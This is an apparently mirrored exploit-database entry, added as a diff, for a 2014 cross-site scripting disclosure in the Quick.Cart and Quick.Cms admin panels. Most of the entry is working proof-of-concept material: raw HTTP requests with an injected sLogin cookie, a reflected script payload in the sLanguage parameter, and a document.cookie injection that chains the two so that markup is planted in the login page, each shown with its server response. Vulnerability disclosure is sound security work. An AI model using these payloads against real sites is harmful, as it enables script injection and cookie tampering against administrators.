@@ -1,0 +1,63 @@
+id: 22422
+date: 07/09/2014
+title: Quick.Cart 6.4 & Quick.Cms 5.4 - Cross Site Scripting Vulnerability
+author: Smash_
+cves: 
+
+#Title: Quick.Cart 6.4 & Quick.Cms 5.4 - Cross Site Scripting
+#Date: 09.07.14
+#Vendor: opensolution.org
+#Affected verions: Quick.Cart and Quick.Cms, latest versions
+#Tested on: Apache 2.2.22 [at] Debian
+#Contact: smash [at] devilteam.pl
+
+Vulnerabilities affects both products in the same way, i'm using Quick.Cart as example.While logging in to admin panel, current username is being stored in sLogin cookie; like this:
+
+POST /quickcart/admin.php?p=tools-config HTTP/1.1
+Host: localhost
+Cookie: sLogin=admin;
+(...)
+
+Since this value is included in website content and it's not verified nor filtered, it is able to perform xss attack. Due to fact that vulnerability exists via cookie, it is not a serious threat.
+
+PoC.
+
+Request:
+POST /quickcart/admin.php?p=tools-config HTTP/1.1
+Host: localhost
+Cookie: sLogin="%3eXSS;
+
+sOption=save+%C2%BB&title=Quick.Cart+-+fast+and+simple+shopping+cart&default_lang=en&admin_lang=en&skin=default&sorting_products=true&currency_symbol=EUR&hidden_shows=false&display_expanded_menu=true&language_in_url=false&start_page=6&basket_page=15&order_page=16&order_print=18&rules_page=4&page_search=17&admin_list=25&products_list=6&change_files_names=false&delete_unused_files=true&wysiwyg=true&send_customer_order_details=false&display_subcategory_products=true&remember_basket=false&description=Freeware%2C+fast%2C+simple%2C+and+multilingual+shopping+cart+system.+It+is+based+on+Flat+Files%2C+uses+templates+system%2C+valid+XHTML+1.1+and+WAI&logo=Quick%3Cspan%3E.%3C%2Fspan%3E%3Cstrong%3ECart%3C%2Fstrong%3E&slogan=Fast+and+simple+shopping+cart&foot_info=Copyright+%C2%A9+2014+%3Ca+href%3D%27http%3A%2F%2Fopensolution.org%2Fquick.cart%2Cen%2C9.html%27%3Efree+shopping+cart%3C%2Fa%3E&login=admin&pass=admin&orders_email=
+
+Response:
+HTTP/1.1 200 OK
+(...)
+</head><body id="bodyLogin"><div id="panelLogin"><div id="top"></div><div id="body"><div id="logo"><a href="http://opensolution.org/" target="_blank"><img src="templates/admin/img/logo_os.jpg" alt="OpenSolution" /></a></div><script type="text/javascript"><!--
+AddOnload( cursor );
+//-->
+</script><form method="post" action="?p=login" name="form"><fieldset><input type="hidden" name="sLoginPageNext" value="/quickcart/admin.php?p=tools-config" /><div id="login"><label>Login:</label><input type="text" name="sLogin" class="input" value="">XSS" />
+(...)
+
+
+Now, second xss comes in handy. It is able to combine both vulnerabilities by editing sLogin cookie via reflected xss; poc:
+
+#1 - Executing popbox
+
+localhost/quickcart/admin.php?p=lang-translations&sLanguage=pl"><script>alert(666)</script>
+
+(...)
+<div class="clear"></div>
+<div id="body"><h1><img src="templates/admin/img/ico_lang.gif" alt="Languages" />Languages pl"><script>alert(666)</script><a href="http://opensolution.org/Quick.Cart/docs/?id=en-instruction#1.6" title="Manual" target="_blank">
+(...)
+
+#2 - Crafting new cookie
+
+localhost/quickcart/admin.php?p=lang-translations&sLanguage=pl<script>document.cookie="sLogin=admin\">sup?";</script>
+
+After visiting crafted url, user won't see any change in rendered content and new cookie will be crafted; when he will log out, code will be included in admin panel login (admin.php).
+
+(...)
+<form method="post" action="?p=login" name="form"><fieldset><input type="hidden" name="sLoginPageNext" value="/quickcart/admin.php" /><div id="login"><label>Login:</label><input type="text" name="sLogin" class="input" value="admin">sup?" /></div><div id="pass"><label>Password:</label><input type="password" name="sPass" class="input" value="" />
+(...)
+
+#  0day.today [2023-03-22]  #
